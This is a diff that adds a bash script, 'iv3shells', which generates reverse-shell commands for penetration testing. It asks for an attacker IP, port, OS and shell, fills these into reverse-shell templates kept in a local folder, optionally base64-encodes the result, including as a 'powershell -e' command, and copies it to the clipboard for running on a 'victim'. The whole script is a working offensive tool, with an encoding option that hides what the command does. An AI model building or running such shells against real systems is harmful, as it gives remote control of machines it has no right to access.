@@ -1,0 +1,186 @@
+#!/bin/bash
+
+getIP() {
+    echo "IP:"
+    read IP
+}
+
+getPort() {
+    echo "PORT:"
+    read PORT 
+}
+getOS() {
+    echo "OS:"
+    read OS 
+}
+
+getShell() {
+    SHELL=$(echo '/bin/bash|/bin/zsh|/bin/sh' | perl -pe 's/\|/\n/g' | fzf --reverse)
+}
+
+generate() {
+    
+    # Get the selected command
+    if [[ "$OS" == "l"* ]]
+    then
+         CMDPATH=$(ls "Reverse Shells/linux" | fzf --reverse)
+        file="Reverse Shells/linux/$CMDPATH"
+    fi
+
+    if [[ "$OS" == "w"* ]]
+    then
+        CMDPATH=$(ls "Reverse Shells/windows" | fzf --reverse)
+        file="Reverse Shells/windows/$CMDPATH"
+    fi
+
+    CMD=$(echo $file | perl -pe 's/^(.*)/cat "$1\"/g' | bash)
+    
+    
+    # Substitute variables for real values
+    SHELL=$(echo $SHELL | perl -pe 's/\//\\\//g')
+    CMD="$(echo $CMD | perl -pe "s/IP/$IP/g; s/PORT/$PORT/g; s/SHELL/$SHELL/g")"
+   
+
+    if $ENCODE 
+    then
+        B64=$(echo "$CMD" | base64)
+        # Convert OS to lowercase
+        OS=$(echo "$OS" | tr "[:upper:]" "[:lower:]")
+
+        [[ "$OS" == "l"* ]] && CMD="\$(echo \"$B64\" | base64 -d)"
+        [[ "$OS" == "w"* ]] && CMD="powershell -e $B64"
+    fi
+
+
+
+    # Copy to clipboard
+    echo ""
+    echo "$CMD" | xclip -sel clip
+    echo "----------------------------------------------------"
+    echo "Copied the following reverseshell to the clipboard: "
+    echo "----------------------------------------------------"
+    echo ""
+    echo "$CMD" | perl -pe 's/\n//g; s/$/\n/'
+    echo ""
+
+}
+
+
+help() {
+    echo ""
+    echo ""
+    echo "     //     ----         __  __            _____ _          _ _          \\\\  "
+    echo "    //       ||         //\\\\//\\\\          / ____| |        | | |          \\\\ "
+    echo "   //        ||     <---\\\\ \/ //--->     | (___ | |__   ___| | |___        \\\\"
+    echo "   \\\\        ||          \\\\  //           \___ \| '_ \ / _ \ | / __|       //"
+    echo "    \\\\       ||        <--\\\\//-->         ____) | | | |  __/ | \__ \      // "
+    echo "     \\\\     ----           \/            |_____/|_| |_|\___|_|_|___/     //  "
+
+    echo "
+    
+
+    Usage: iv3shells [ OPTIONS ]
+
+    I <3 Shells (iv3shells) is a script that generates reverse-shells in a quick-and-easy way.
+    It will ask for the information needed (unless given through options), and then copy a command to the clipboard
+    The main idea behind this script is to simplify the process of creating reverse-shells on a "victim" while pen-testing.
+
+
+    Options:
+      -p          Specify port
+      -i          Specify IP
+      -s          Specify Shell
+      -o          Specify OS
+      -e          Base64 encode the reverse shell 
+      -h          Show this help page
+   
+ 
+
+     CREDS
+    --------
+    This script is inspired by the Hack-Tools project and Villain, made by Ludovic Coulon & Riadh Bouchahoua,
+    and t3l3machus respectively. 
+
+    Links:
+     - https://github.com/t3l3machus/Villain
+     - https://github.com/LasCC/Hack-Tools
+
+
+     AUTHOR
+    --------
+    This script is written by arch-err, see github links below:
+
+    https://github.com/arch-err/
+    The source of this script can be found at https://github.com/arch-err/iv3shells
+
+    "       # <---- CHANGE NAME HERE
+}
+
+
+
+
+# Handle options/flags
+SHELL=""
+PORT=""
+IP=""
+ENCODE=false
+
+while getopts ":o:ep:s:i:h" opt; do
+  case $opt in
+    o)
+      OS=$OPTARG;;
+    p)
+      PORT=$OPTARG;;
+    i)
+      IP=$OPTARG;;
+    s)
+      SHELL=$OPTARG;;
+    e)
+      ENCODE=true;; 
+    h)
+      # Help/usage information
+      help
+      exit 0
+      ;;
+    :)
+      echo "Option -$OPTARG requires an argument."
+      exit 1
+      ;;
+    ?)
+      echo "Invalid option: -$OPTARG"
+      exit 1
+      ;;
+  esac
+done
+
+[[ -z $IP ]] && getIP 
+[[ -z $PORT ]] && getPort 
+[[ -z $OS ]] && getOS 
+[[ $OS == "l"* ]] && [[ -z $SHELL ]] && getShell 
+
+
+# Error handling for SHELL, IP and PORT
+if ! echo $IP | grep -P "\d+\.\d+\.\d+\.\d+|localhost" &>/dev/null
+then
+    echo "Not a valid IP!"
+    getIP
+fi
+
+if [[ $OS == "l"* ]]
+then
+    if ! echo $SHELL | grep -P "/bin/.*" &>/dev/null
+    then
+        echo "Not a valid shell!"
+        getShell
+    fi
+fi
+
+if ! echo $PORT | grep -P "\d+" &>/dev/null
+then
+    echo "Not a valid port!"
+    getPort
+fi
+
+
+
+generate
